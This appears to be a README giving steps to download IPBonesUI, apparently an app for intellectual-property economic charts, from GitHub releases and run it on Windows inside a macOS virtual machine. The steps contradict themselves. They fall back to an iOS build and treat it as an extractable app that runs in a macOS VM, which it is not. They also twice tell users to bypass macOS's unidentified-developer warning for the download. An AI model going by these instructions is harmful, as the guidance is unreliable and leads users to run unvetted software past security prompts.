## 🚀 How to Download and Run IPBonesUI on Windows

1. **Visit the Releases Page**  
   Open your web browser and go to:  
   https://github.com/fvalenzuela1/IPBonesUI/releases  

2. **Download the Latest macOS or iOS Build**  
   Look for the latest release. Each release has files attached, usually ending with `.app.zip` or `.ipa` for iOS. Download the macOS `.app.zip` file if available. Otherwise, download the available iOS build.  

3. **Extract the Downloaded File**  
   After the download finishes, find the `.zip` file in your Downloads folder. Right-click and select “Extract All...” or use your preferred unzip tool. This will unpack the IPBonesUI app.  

4. **Run on Windows Using a Virtual Machine (VM)**  
   Since IPBonesUI is designed for macOS/iOS, it cannot run natively on Windows. You need virtual machine software to run macOS on your PC. Common tools include:  

   - [Oracle VirtualBox](https://www.virtualbox.org/)  
   - [VMware Workstation Player](https://www.vmware.com/products/workstation-player.html)  

   Set up a macOS VM following instructions specific to the VM software. You can find guides online by searching “install macOS on VirtualBox Windows.”  

5. **Transfer IPBonesUI to the macOS VM**  
   Once your macOS VM is running, copy the extracted IPBonesUI `.app` folder into the VM. You can use shared folders set up in the VM, cloud storage like Dropbox, or a USB drive.  

6. **Open IPBonesUI in macOS VM**  
   Open Finder inside the VM and navigate to the IPBonesUI app location. Double-click to launch the app. You might have to right-click and select “Open” on the first run to bypass macOS security restrictions.  

7. **Using IPBonesUI**  
   The app will open and provide the UI to interact with IPBones. Use the menus and buttons to view charts and economic data related to intellectual property.

## ❓ Troubleshooting

- **App will not open**  
  Make sure you have extracted the app completely. If running in VM, macOS may block apps from unidentified developers. Right-click the app and select “Open” to bypass this.  

- **VM Performance is slow**  
  Increase RAM allocated to your VM or close other heavy programs.  

- **Cannot find .app file after download**  
  Check that your unzip completed properly. Try re-downloading if necessary.  

- **Data does not load**  
  Ensure your VM or device has an internet connection. Check if the data source or app version is up to date.
